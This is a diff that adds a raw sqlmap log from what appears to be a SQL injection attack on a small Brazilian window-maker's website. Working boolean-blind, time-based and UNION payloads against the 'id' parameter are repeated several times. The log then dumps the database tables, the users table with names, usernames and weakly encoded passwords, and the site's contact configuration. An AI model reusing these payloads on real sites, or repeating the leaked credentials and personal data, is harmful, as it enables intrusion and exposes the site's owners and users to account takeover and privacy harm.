@@ -1,0 +1,197 @@
+sqlmap identified the following injection point(s) with a total of 181 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: site=conteudos&id=1 AND 6830=6830
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: site=conteudos&id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: site=conteudos&id=-2650 UNION ALL SELECT NULL,CONCAT(0x7171627871,0x4f4464566557785a425a5653564c74686a4e46795a4c684b42777565665950574950737568624748,0x71767a6a71),NULL,NULL-- xJOf
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] dmeloesquadria
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: site=conteudos&id=1 AND 6830=6830
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: site=conteudos&id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: site=conteudos&id=-2650 UNION ALL SELECT NULL,CONCAT(0x7171627871,0x4f4464566557785a425a5653564c74686a4e46795a4c684b42777565665950574950737568624748,0x71767a6a71),NULL,NULL-- xJOf
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: dmeloesquadria
+[13 tables]
++----------------------+
+| album                |
+| album_fotos          |
+| configuracoes        |
+| conteudos            |
+| noticias             |
+| noticias_comentarios |
+| opt_cidades          |
+| opt_estado           |
+| produtos             |
+| produtos_categorias  |
+| produtos_fotos       |
+| usuarios             |
+| usuarios_niveis      |
++----------------------+
+
+Database: dmeloesquadria
++----------------------+---------+
+| Table                | Entries |
++----------------------+---------+
+| opt_cidades          | 9714    |
+| produtos_fotos       | 361     |
+| album_fotos          | 236     |
+| noticias             | 35      |
+| opt_estado           | 27      |
+| album                | 14      |
+| produtos             | 9       |
+| produtos_categorias  | 5       |
+| conteudos            | 2       |
+| noticias_comentarios | 2       |
+| usuarios             | 2       |
+| usuarios_niveis      | 2       |
+| configuracoes        | 1       |
++----------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: site=conteudos&id=1 AND 6830=6830
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: site=conteudos&id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: site=conteudos&id=-2650 UNION ALL SELECT NULL,CONCAT(0x7171627871,0x4f4464566557785a425a5653564c74686a4e46795a4c684b42777565665950574950737568624748,0x71767a6a71),NULL,NULL-- xJOf
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: dmeloesquadria
+Table: usuarios
+[2 entries]
++----+-----------------------+--------------+----------------+
+| id | nome                  | senha        | usuario        |
++----+-----------------------+--------------+----------------+
+| 1  | Alternative ART       | MDYxMDA2ODQz | alternativeart |
+| 31 | Mateus Melo de Moraes | MTIz         | mateus         |
++----+-----------------------+--------------+----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: site=conteudos&id=1 AND 6830=6830
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: site=conteudos&id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: site=conteudos&id=-2650 UNION ALL SELECT NULL,CONCAT(0x7171627871,0x4f4464566557785a425a5653564c74686a4e46795a4c684b42777565665950574950737568624748,0x71767a6a71),NULL,NULL-- xJOf
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: dmeloesquadria
+[13 tables]
++----------------------+
+| album                |
+| album_fotos          |
+| configuracoes        |
+| conteudos            |
+| noticias             |
+| noticias_comentarios |
+| opt_cidades          |
+| opt_estado           |
+| produtos             |
+| produtos_categorias  |
+| produtos_fotos       |
+| usuarios             |
+| usuarios_niveis      |
++----------------------+
+
+Database: dmeloesquadria
++----------------------+---------+
+| Table                | Entries |
++----------------------+---------+
+| opt_cidades          | 9714    |
+| produtos_fotos       | 361     |
+| album_fotos          | 236     |
+| noticias             | 35      |
+| opt_estado           | 27      |
+| album                | 14      |
+| produtos             | 9       |
+| produtos_categorias  | 5       |
+| conteudos            | 2       |
+| noticias_comentarios | 2       |
+| usuarios             | 2       |
+| usuarios_niveis      | 2       |
+| configuracoes        | 1       |
++----------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: site=conteudos&id=1 AND 6830=6830
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: site=conteudos&id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: site=conteudos&id=-2650 UNION ALL SELECT NULL,CONCAT(0x7171627871,0x4f4464566557785a425a5653564c74686a4e46795a4c684b42777565665950574950737568624748,0x71767a6a71),NULL,NULL-- xJOf
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: dmeloesquadria
+Table: configuracoes
+[1 entry]
++-----------------------------------+--------------------------------+-------------------------------------------------------------------------------------------------------+---------+--------------------------------+------------------------------+--------------------------------------------------------------------------------------------+
+| site                              | email                          | rodape                                                                                                | visitas | descricao                      | titulo_site                  | palavras_chave                                                                             |
++-----------------------------------+--------------------------------+-------------------------------------------------------------------------------------------------------+---------+--------------------------------+------------------------------+--------------------------------------------------------------------------------------------+
+| http://www.dmeloesquadrias.com.br | contato@dmeloesquadrias.com.br | CopyRight 2011 D\x92Melo Esquadrias de Madeira. Todos os direitos Reservados. Contato: (51) 3722 6260 | 414564  | D'Melo - Esquadrias de Madeira | D'Melo Esquadrias de Madeira | esquadrias, madeira, dmelo, madeira de lei, janelas, portas, janela bay windows, Gonçalves |
++-----------------------------------+--------------------------------+-------------------------------------------------------------------------------------------------------+---------+--------------------------------+------------------------------+--------------------------------------------------------------------------------------------+
+
